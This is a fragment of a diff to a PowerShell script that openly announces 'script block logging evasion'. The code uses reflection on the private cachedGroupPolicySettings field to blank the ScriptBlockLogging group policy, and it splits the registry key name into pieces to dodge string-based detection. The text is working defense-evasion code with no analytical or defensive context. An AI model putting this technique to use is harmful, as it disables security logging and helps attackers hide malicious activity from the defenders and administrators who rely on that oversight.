@@ -1,9 +1,8 @@
 try 
 {
 	Write-host " "
-        #$ErrorActionPreference = "SilentlyContinue";
         
-	Write-host "Running script block logging bypass"
+	Write-host "Running script block logging evasion"
 
 	$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 	$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
